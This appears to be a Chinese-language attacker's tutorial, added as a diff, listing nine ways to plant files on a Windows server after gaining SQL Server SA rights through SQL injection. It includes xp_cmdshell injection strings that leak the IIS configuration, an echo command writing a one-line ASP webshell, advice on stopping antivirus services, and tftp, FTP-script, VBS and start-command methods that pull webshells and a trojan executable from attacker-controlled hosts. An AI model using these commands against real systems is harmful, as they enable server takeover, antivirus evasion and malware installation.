@@ -1,0 +1,73 @@
+
+SA权限九种上传方法
+
+读取IIS配置信息获取web路径
+     
+     注入点后面执行   ;exec master..xp_cmdshell 'copy C:\Windows\system32\inetsrv\MetaBase.xml C:\Windows\Help\iisHelp\common\404b.htm'--
+
+执行命令
+     
+     注入点后面执行   ;exec master..xp_cmdshell 'ver >C:\Windows\Help\iisHelp\common\404b.htm'--
+
+
+SA权限权利非常大,但可能有的朋友感觉使用起来不方便,接下来和大家一起讨论几种上传文件的方法,
+
+如果还有别的方法,希望大家提出,技术越辩起明,越明越高。
+
+一、NBSI的命令方法:写入一句话木SHELL,命令如下:
+
+echo ^<25%execute request("#")25%^> >d:\web\mm.asp 这样要写入一句话木马,
+
+如果说被杀软,KILL掉,就可以连上去了。net stop "服务名"可以停掉服务。
+
+二、NBSI3。0自带文件上传功能，也可以使用。缺点速度慢。建议上传短小的WEBSHELL
+
+三、把一句话木马与入数据库，然后利用NBSI数据库差异备份功能
+
+四、如网站有论坛且开放上传附件功能，可直接在论坛上传文件（把WEBSHELL改成可能上传的文件类型，如JPG，GIF）
+
+五、利用NBSI等注入工具，浏览网站数据库连接文件（前提数据库和WEB在一台机器上，可利用IPCNFIG /ALL命令判断）找出SA的连接密码。
+
+利用MSSQL2000自带的事件查询分析器，连数库机器，通过浏览数据库找出后台密码
+
+如果是MD5可利用Update语句进行更改也可利用Insert加入一新用户，不用在爆破MD5，进入后台，寻找上传WEBSHELL方法。
+
+六、tftp命令法： TFTP [-i] host [GET | PUT] source [destination]  首先在自己的机器或已经控制的肉鸡上开TFTP服务，
+
+工具：TFTP32.EXE不错。
+
+比如：
+
+肉鸡IP：192.168.1.1 
+具有SA权限的机器是192.168.1.2
+
+执行命令: tftp -i 192.168.1.1 get webshell.asp d:\web\webshell.asp 如果成功,就会在192.168.1.2的D盘web 目录下生成文件:webshell.asp
+
+七、ftp方法:前提是有一个可访问的外网FTP空间().命令ECHO命令,前面讲的方法:在目标机器上生成文件ftp.txt
+
+echo open http://www.ftp.com/>ftp.TXT //连接FTP
+echo  username>>ftp.TXT       //输入用户名
+echo  password>>ftp.TXT       //输入密码
+echo get webshell.asp d:\web\webshell.asp>>ftp.TXT //执行下载命令
+echo bye>>ftp.TXT             //退出
+ftp -s:ftp.txt                //执行FTP.TXT文件中的FTP命令
+
+八、vbs脚本方法:
+利用ECHO命令写入文件: get.vbs,内容如下:
+On Error Resume Next
+Dim iRemote,iLocal
+iLocal = LCase(WScript.Arguments(1))
+iRemote = LCase(WScript.Arguments(0))
+Set xPost = createObject("Microsoft.XMLHTTP")
+xPost.Open "GET",iRemote,0
+xPost.Send()
+Set sGet = createObject("ADODB.Stream")
+sGet.Mode = 3
+sGet.Type = 1
+sGet.Open()
+sGet.Write(xPost.responseBody)
+sGet.SaveToFile iLocal,2
+然后命令行下执行:cscript get.vbs http://ip/muma.exe c:\muma.exe
+
+九、start命令法，此方法不常用，但也是一种方法，
+start http://ip/a.html这候a.html文件以及它包括的图片会保存在机器的，如果我们把自己的程序改名为a.jpg嵌套在a.html中这时候可以下载到IE缓存中。可以利用dir /s a*.jpg进行搜索。如搜索到，可以利用COPY命令复制出来。
